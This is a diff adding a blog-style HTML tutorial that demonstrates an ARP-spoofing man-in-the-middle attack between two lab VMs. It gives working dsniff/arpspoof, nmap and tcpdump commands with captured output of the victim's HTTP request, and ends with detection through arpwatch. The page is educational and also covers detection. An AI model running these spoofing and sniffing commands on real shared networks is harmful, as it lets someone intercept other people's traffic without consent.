@@ -1,0 +1,326 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="content-type" content="text/html; charset=utf-8" />
+<title>InterCloudZone</title>
+<meta name="keywords" content="" />
+<meta name="description" content="" />
+<link href="style.css" rel="stylesheet" type="text/css" media="screen" />
+<link href="google-code-prettify/sunburst.css" type="text/css" rel="stylesheet" />
+
+<!--[if IE]>
+<style type="text/css">
+#sidebar #calendar {
+	background-position: 0px 20px;
+}
+</style>
+<![endif]-->
+
+<script src="http://www.google.com/jsapi" type="text/javascript"></script>
+<script type="text/javascript">google.load("jquery", "1.3.2");</script>
+<script type="text/javascript" src="/google-code-prettify/prettify.js?autoload=true&;lang=css;skin=sunburst""></script>
+<script src="https://google-code-prettify.googlecode.com/svn/loader/run_prettify.js?autoload=true&amp;lang=css&amp;skin=sunburst"></script>
+</head>
+<body>
+<div id="logo">
+	<h1> InterCloudZone.com </h1>
+</div>
+<div id="menu">
+	<ul>
+		<li class="first"><a href="http://www.intercloudzone.com" accesskey="1" title="">Home</a></li>
+		<li><a href="http://sourceforge.net/projects/oraclerman/" accesskey="2" title="">OpenSource</a></li>
+		<li><a href="http://padmavyuha.blogspot.com/" accesskey="3" title="">Blogs</a></li>
+		<li><a href="http://www.linkedin.com/in/baburajkallarakkal" accesskey="4" title="">Profile</a></li>
+	</ul>
+	 
+</div>
+<hr />
+<!-- div id="banner"><img src="images/img09.jpg" alt="" width="960" height="147" / ></div -->
+<!-- start page -->
+
+<div id="swift-page" class="default-page" >
+	<!-- start content -->
+	<h2 class="title"> Man-In-The-Middle-Attack (MITM) using arpspoof  </h2>
+
+	<p> 
+
+	Man in the middle attack as the name imples is when a possible malicious user hijack's the conversation that's occuring between two parties. Attacker redirects the traffic to go through 
+	his system and using sniffing methods he can listen to it and while doing so victim and the router/gateway will have no knowledge that their conversation are being sniffed. 
+	
+	</p> 
+	
+	<p> 
+	
+	Below is a simple setup with which I tried to demonstrate this using 2 VM's. RBNETAPP will be the victim host and RBNETLAB will be used to trigger Man-In-Middle-Attack
+	and the router/gateway IP is 192.168.2.1. 
+	
+	</p> 
+	
+	
+<pre>
+	
+[root@rbnetapp ~]# ifconfig enp0s8 | egrep -w 'inet|ether' | awk '{print $1 " " $2}'
+inet 192.168.2.152
+ether 08:00:27:85:30:eb
+
+[root@rbnetlab ~]# ifconfig enp0s8 | egrep -w 'inet|ether' | awk '{print $1 " " $2}'
+inet 192.168.2.153
+ether 08:00:27:b3:8b:b2
+
+</pre>				 
+				
+
+<p> 
+	We need to enable the packet forwarding on the malicious system - here in my case it's RBNETLAB and install arpspoof which comes in dsniff  package. First time around when I did the test - found few ICMP blocks coming  through the firewalld, so disabled
+	that temporarily.
+<p/>
+
+<pre>
+On RBNETLAB..
+
+yum install http://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpm -y
+yum install dsniff -y
+echo "1" > /proc/sys/net/ipv4/ip_forward
+systemctl firewalld stop
+
+</pre>
+
+<p> 
+
+	Next thing is to tell the RBNETAPP (Victim) that MAC address for the Gateway IP ( 192.168.2.1 ) is that of RBNETLAB. In otherwords tell RBNETAPP
+	that 192.168.2.1 has a MAC of 08:00:27:b3:8b:b2. At the same time tell ROUTER/GATEWAY that MAC address of 192.168.2.152 is 08:00:27:b3:8b:b2.
+</p>
+	
+<p> 
+	This can be acheived by updating the ARP cache on both ends doing arpspoofing/arpings.
+</p>
+
+<p> 
+	In a real-life scenario, RBNETAPP could be a person/PC browsing internet sitting in a StarBucks cafe and 
+	RBNETLAB is another person/PC who is connected to the same wifi router.
+</p>
+	
+<p> 
+	So identify the subnet you are in. In my case it's subnetmask = 255.255.255.0 or otherwise /24 CIDR.
+	Scan for the nearby IP's and ports that are open.
+</p>
+
+<pre>
+
+On RBNETLAB..
+
+nmap -v 192.168.2.0/24
+
+Nmap scan report for rbnetapp (192.168.2.152)
+Host is up (0.00030s latency).
+Not shown: 999 filtered ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+MAC Address: 08:00:27:85:30:EB (Cadmus Computer Systems)
+
+</pre>	
+	
+<p> 		
+	Initiate arpspoof attack. Either have 3 ssh sessions opened or another way is to do it through 'screen' (yum install screen)
+	
+</p>
+
+<pre>
+
+--Spoof the router
+[root@rbnetlab ~]# arpspoof -i enp0s8 -t 192.168.2.1 192.168.2.152
+8:0:27:b3:8b:b2 xx:xx:xx:xx:6a:1e 0806 42: arp reply 192.168.2.152 is-at 8:0:27:b3:8b:b2
+8:0:27:b3:8b:b2 xx:xx:xx:xx:6a:1e 0806 42: arp reply 192.168.2.152 is-at 8:0:27:b3:8b:b2
+
+--Spoof the victim
+[root@rbnetlab ~]# arpspoof -i enp0s8 -t 192.168.2.152 192.168.2.1
+8:0:27:b3:8b:b2 8:0:27:85:30:eb 0806 42: arp reply 192.168.2.1 is-at 8:0:27:b3:8b:b2
+8:0:27:b3:8b:b2 8:0:27:85:30:eb 0806 42: arp reply 192.168.2.1 is-at 8:0:27:b3:8b:b2
+
+</pre>	
+
+
+<p> 
+	Check the arp cache from RBNETAPP (this is for demo) - in real world can't do it.
+	Pay attention to the MAC of 192.168.2.1, which is now the MAC of the RBNETLAB
+		
+</p>
+
+<pre>
+
+
+[root@rbnetapp ~]# arp -n
+Address                  HWtype  HWaddress           Flags Mask            Iface
+..
+192.168.2.1              ether   08:00:27:b3:8b:b2   C                     enp0s8
+192.168.2.153            ether   08:00:27:b3:8b:b2   C                     enp0s8
+..
+
+Output trimmed 
+
+
+</pre>	
+
+
+<p> 
+	
+	Trigger a tcpdump to capture any traffic on one of the sessions - for the purpose of this test to get a trimmed output I'm filtering based on 'wikipidea' host.
+	
+</p>
+
+
+<pre>
+ 
+[root@rbnetlab ~]# tcpdump -p -X -s0 -vvv -i enp0s8 host "en.wikipedia.org"
+	
+</pre>	
+	
+
+<p> 
+		Initiate a cURL request from RBNETAPP  
+	 
+</p>
+
+
+<pre>
+ 
+[root@rbnetapp ~]# curl http://en.wikipedia.org/wiki/Jimmy_Wales
+
+
+</pre>	
+	
+	
+<p> 
+		Check the packet capture output. You can either redirect this to console or use -w <Filename>.pcap to 
+		capture this in a file (better so) which can be analyzed through the WireShark tool.
+		
+</p>
+
+<pre>
+
+
+
+[root@rbnetlab ~]# tcpdump -p -X -s0 -vvv -i enp0s8 host "en.wikipedia.org"
+tcpdump: listening on enp0s8, link-type EN10MB (Ethernet), capture size 65535 bytes
+14:39:59.644560 IP (tos 0x0, ttl 64, id 56798, offset 0, flags [DF], proto TCP (6), length 60)
+	rbnetapp.45580 > text-lb.eqiad.wikimedia.org.http: Flags [S], cksum 0xd430 (correct), seq 919368237, win 14600, options [mss 1460,sackOK,TS val 17608691 ecr 0,nop,wscale 7], length 0
+		0x0000:  4500 003c ddde 4000 4006 2e6c c0a8 0298  E..<..@.@..l....
+		0x0010:  d050 9ae0 b20c 0050 36cc 722d 0000 0000  .P.....P6.r-....
+		0x0020:  a002 3908 d430 0000 0204 05b4 0402 080a  ..9..0..........
+		0x0030:  010c aff3 0000 0000 0103 0307            ............
+14:39:59.644629 IP (tos 0x0, ttl 63, id 56798, offset 0, flags [DF], proto TCP (6), length 60)
+	rbnetapp.45580 > text-lb.eqiad.wikimedia.org.http: Flags [S], cksum 0xd430 (correct), seq 919368237, win 14600, options [mss 1460,sackOK,TS val 17608691 ecr 0,nop,wscale 7], length 0
+		0x0000:  4500 003c ddde 4000 3f06 2f6c c0a8 0298  E..<..@.?./l....
+		0x0010:  d050 9ae0 b20c 0050 36cc 722d 0000 0000  .P.....P6.r-....
+		0x0020:  a002 3908 d430 0000 0204 05b4 0402 080a  ..9..0..........
+		0x0030:  010c aff3 0000 0000 0103 0307            ............
+14:39:59.677918 IP (tos 0x20, ttl 55, id 0, offset 0, flags [DF], proto TCP (6), length 60)
+	text-lb.eqiad.wikimedia.org.http > rbnetapp.45580: Flags [S.], cksum 0xc407 (correct), seq 3949036967, ack 919368238, win 28960, options [mss 1460,sackOK,TS val 1112810656 ecr 17608691,nop,wscale 9], length 0
+		0x0000:  4520 003c 0000 4000 3706 152b d050 9ae0  E..<..@.7..+.P..
+		0x0010:  c0a8 0298 0050 b20c eb61 85a7 36cc 722e  .....P...a..6.r.
+		0x0020:  a012 7120 c407 0000 0204 05b4 0402 080a  ..q.............
+		0x0030:  4254 24a0 010c aff3 0103 0309            BT$.........
+14:39:59.677927 IP (tos 0x20, ttl 54, id 0, offset 0, flags [DF], proto TCP (6), length 60)
+	text-lb.eqiad.wikimedia.org.http > rbnetapp.45580: Flags [S.], cksum 0xc407 (correct), seq 3949036967, ack 919368238, win 28960, options [mss 1460,sackOK,TS val 1112810656 ecr 17608691,nop,wscale 9], length 0
+		0x0000:  4520 003c 0000 4000 3606 162b d050 9ae0  E..<..@.6..+.P..
+		0x0010:  c0a8 0298 0050 b20c eb61 85a7 36cc 722e  .....P...a..6.r.
+		0x0020:  a012 7120 c407 0000 0204 05b4 0402 080a  ..q.............
+		0x0030:  4254 24a0 010c aff3 0103 0309            BT$.........
+14:39:59.678086 IP (tos 0x0, ttl 64, id 56799, offset 0, flags [DF], proto TCP (6), length 52)
+	rbnetapp.45580 > text-lb.eqiad.wikimedia.org.http: Flags [.], cksum 0x6362 (correct), seq 1, ack 1, win 115, options [nop,nop,TS val 17608724 ecr 1112810656], length 0
+		0x0000:  4500 0034 dddf 4000 4006 2e73 c0a8 0298  E..4..@.@..s....
+		0x0010:  d050 9ae0 b20c 0050 36cc 722e eb61 85a8  .P.....P6.r..a..
+		0x0020:  8010 0073 6362 0000 0101 080a 010c b014  ...scb..........
+		0x0030:  4254 24a0                                BT$.
+14:39:59.678093 IP (tos 0x0, ttl 63, id 56799, offset 0, flags [DF], proto TCP (6), length 52)
+	rbnetapp.45580 > text-lb.eqiad.wikimedia.org.http: Flags [.], cksum 0x6362 (correct), seq 1, ack 1, win 115, options [nop,nop,TS val 17608724 ecr 1112810656], length 0
+		0x0000:  4500 0034 dddf 4000 3f06 2f73 c0a8 0298  E..4..@.?./s....
+		0x0010:  d050 9ae0 b20c 0050 36cc 722e eb61 85a8  .P.....P6.r..a..
+		0x0020:  8010 0073 6362 0000 0101 080a 010c b014  ...scb..........
+		0x0030:  4254 24a0                                BT$.
+14:39:59.678299 IP (tos 0x0, ttl 64, id 56800, offset 0, flags [DF], proto TCP (6), length 148)
+	rbnetapp.45580 > text-lb.eqiad.wikimedia.org.http: Flags [P.], cksum 0xa51a (correct), seq 1:97, ack 1, win 115, options [nop,nop,TS val 17608725 ecr 1112810656], length 96
+		0x0000:  4500 0094 dde0 4000 4006 2e12 c0a8 0298  E.....@.@.......
+		0x0010:  d050 9ae0 b20c 0050 36cc 722e eb61 85a8  .P.....P6.r..a..
+		0x0020:  8018 0073 a51a 0000 0101 080a 010c b015  ...s............
+		0x0030:  4254 24a0 4745 5420 2f77 696b 692f 4a69  BT$.GET./wiki/Ji
+		0x0040:  6d6d 795f 5761 6c65 7320 4854 5450 2f31  mmy_Wales.HTTP/1
+		0x0050:  2e31 0d0a 5573 6572 2d41 6765 6e74 3a20  .1..User-Agent:.
+		0x0060:  6375 726c 2f37 2e32 392e 300d 0a48 6f73  curl/7.29.0..Hos
+		0x0070:  743a 2065 6e2e 7769 6b69 7065 6469 612e  t:.en.wikipedia.
+		0x0080:  6f72 670d 0a41 6363 6570 743a 202a 2f2a  org..Accept:.*/*
+		0x0090:  0d0a 0d0a                                ....
+14:39:59.678306 IP (tos 0x0, ttl 63, id 56800, offset 0, flags [DF], proto TCP (6), length 148)
+	rbnetapp.45580 > text-lb.eqiad.wikimedia.org.http: Flags [P.], cksum 0xa51a (correct), seq 1:97, ack 1, win 115, options [nop,nop,TS val 17608725 ecr 1112810656], length 96
+		0x0000:  4500 0094 dde0 4000 3f06 2f12 c0a8 0298  E.....@.?./.....
+		0x0010:  d050 9ae0 b20c 0050 36cc 722e eb61 85a8  .P.....P6.r..a..
+		0x0020:  8018 0073 a51a 0000 0101 080a 010c b015  ...s............
+		0x0030:  4254 24a0 4745 5420 2f77 696b 692f 4a69  BT$.GET./wiki/Ji
+		0x0040:  6d6d 795f 5761 6c65 7320 4854 5450 2f31  mmy_Wales.HTTP/1
+		0x0050:  2e31 0d0a 5573 6572 2d41 6765 6e74 3a20  .1..User-Agent:.
+		0x0060:  6375 726c 2f37 2e32 392e 300d 0a48 6f73  curl/7.29.0..Hos
+		0x0070:  743a 2065 6e2e 7769 6b69 7065 6469 612e  t:.en.wikipedia.
+		0x0080:  6f72 670d 0a41 6363 6570 743a 202a 2f2a  org..Accept:.*/*
+		0x0090:  0d0a 0d0a                      
+
+</pre>	
+
+<p> 
+	How to detect if the arpspoof is happening? One of the options is using arpwatch. 
+	So on RBNETAPP install arpwatch and initiate it against that enp0s8 interface.
+</p>
+
+<pre>
+	
+yum install arpwatch -y
+arpwatch -i enp0s8
+
+
+tail -f /var/log/messages
+...
+Apr 29 14:21:48 localhost kernel: device enp0s8 entered promiscuous mode
+Apr 29 14:21:48 localhost arpwatch: listening on enp0s8
+..
+	
+</pre>	
+
+<p> 		
+	During arpspoofing you can see the MAC address's being flopped. I have masked my routers MAC with 'XXX's but that essentially 
+	is the output which will tell you that a MAC address is being flapped.
+	
+	I have masked my ROUTER's MAC with xx.xx.xx.xx
+	 
+</p>
+
+<pre>
+
+/var/log/messages
+Apr 29 14:28:38 localhost arpwatch: flip flop 192.168.2.1 08:00:27:b3:8b:b2 (xx:xx:xx:xx:6a:1e)
+Apr 29 14:28:38 localhost arpwatch: flip flop 192.168.2.1 xx:xx:xx:xx:6a:1e (08:00:27:b3:8b:b2)
+
+
+</pre>	
+		
+		
+<p> 
+		Hope this helps someone in their inquisitive ride.....
+		
+</p>
+ 
+	
+<script>$( "pre" ).addClass( "prettyprint" );</script>	
+	
+	<div id="content">
+	<!-- end content -->
+	</div>
+<!-- end page -->
+<div id="footer">
+	<p class="legal">Copyright (c) 2015 InterCloudZone.com. All rights reserved.</p>
+</div>
+
+
+
+</body>
+
+</html>
